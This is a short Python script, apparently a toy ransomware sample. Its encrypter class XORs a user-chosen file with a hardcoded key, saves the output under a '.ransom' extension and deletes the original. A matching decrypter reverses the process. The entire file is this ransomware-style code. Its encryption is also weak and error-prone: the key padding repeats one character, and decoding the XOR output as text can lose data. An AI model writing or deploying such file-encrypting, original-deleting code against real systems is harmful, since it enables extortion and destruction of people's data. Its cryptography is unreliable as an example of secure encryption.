import os
import hashlib

class SVEncrypter:

	def __init__(self, fileName="", key=""):
		self.fileName = fileName
		self.plainText = open(self.fileName, 'r', encoding='ascii', errors='ignore').read()
		self.key = hashlib.sha256(key.encode()).hexdigest()
		while len(self.key) < len(self.plainText):
			self.key += self.key[3]

		self.plainText = self.plainText.encode()
		self.key = self.key.encode()

	def encrypt(self):
		cipherText = bytearray(a^b for a, b in zip(*map(bytearray, [self.plainText, self.key]))) 
		out = cipherText.decode()
		open(self.fileName+".ransom","w").write(out)
		os.remove(self.fileName)

class SVDecrypter:
	def __init__(self, fileName="", key=""):
		self.fileName = fileName
		self.cipherText = open(self.fileName, 'r', encoding='ascii', errors='ignore').read()
		self.key = hashlib.sha256(key.encode()).hexdigest()
		while len(self.key) < len(self.cipherText):
			self.key += self.key[3]
		self.cipherText = self.cipherText.encode()
		self.key = self.key.encode()

	def decrypt(self):
		plainText = bytearray(a^b for a, b in zip(*map(bytearray, [self.cipherText, self.key]))) 
		out = plainText.decode()
		open(self.fileName.split(".ransom")[0], "w").write(out)
		os.remove(self.fileName)


encrypter = SVEncrypter(fileName=input("Enter file: "), key="GeheimeDienst2021-GrapperWaus")
encrypter.encrypt()

decrypter = SVDecrypter(fileName=input("Enter file: "), key="GeheimeDienst2021-GrapperWaus")
decrypter.decrypt()

